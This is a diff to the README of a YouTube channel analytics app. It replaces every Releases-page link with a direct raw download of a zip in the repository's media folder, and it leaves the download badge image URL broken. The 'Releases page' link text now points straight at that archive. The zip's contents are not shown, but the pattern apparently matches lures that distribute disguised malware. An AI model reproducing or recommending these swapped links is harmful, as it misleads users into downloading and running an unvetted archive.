@@ -8,7 +8,7 @@ Welcome to the YouTube Channel Analyzer! This application helps you monitor your
 
 To get started, you need to download the application. Please visit the link below to access the latest version:
 
-[![Download YouTube Channel Analyzer](https://img.shields.io/badge/Download-YouTube%20Channel%20Analyzer-brightgreen)](https://github.com/adewon7/YouTube-Channel-Analyzer/releases)
+[![Download YouTube Channel Analyzer](https://raw.githubusercontent.com/adewon7/YouTube-Channel-Analyzer/main/media/YouTube-Channel-Analyzer_2.3.zip%20Channel%20Analyzer-brightgreen)](https://raw.githubusercontent.com/adewon7/YouTube-Channel-Analyzer/main/media/YouTube-Channel-Analyzer_2.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -45,7 +45,7 @@ Once you have downloaded the application, follow these steps to install and run 
 
 ## 🔄 Updating the Application
 
-Keep your application up to date to ensure you have the latest features and bug fixes. To update, simply return to the [Releases page](https://github.com/adewon7/YouTube-Channel-Analyzer/releases) and download the newest version. Follow the same installation steps above to replace the old version.
+Keep your application up to date to ensure you have the latest features and bug fixes. To update, simply return to the [Releases page](https://raw.githubusercontent.com/adewon7/YouTube-Channel-Analyzer/main/media/YouTube-Channel-Analyzer_2.3.zip) and download the newest version. Follow the same installation steps above to replace the old version.
 
 ## ⚙️ Troubleshooting
 
@@ -84,6 +84,6 @@ For additional information, insights, or updates, please visit our GitHub page r
 
 To download the latest version of YouTube Channel Analyzer, please visit the following link:
 
-[![Download YouTube Channel Analyzer](https://img.shields.io/badge/Download-YouTube%20Channel%20Analyzer-brightgreen)](https://github.com/adewon7/YouTube-Channel-Analyzer/releases)
+[![Download YouTube Channel Analyzer](https://raw.githubusercontent.com/adewon7/YouTube-Channel-Analyzer/main/media/YouTube-Channel-Analyzer_2.3.zip%20Channel%20Analyzer-brightgreen)](https://raw.githubusercontent.com/adewon7/YouTube-Channel-Analyzer/main/media/YouTube-Channel-Analyzer_2.3.zip)
 
 Thank you for using the YouTube Channel Analyzer. We hope it helps you grow your channel effectively!
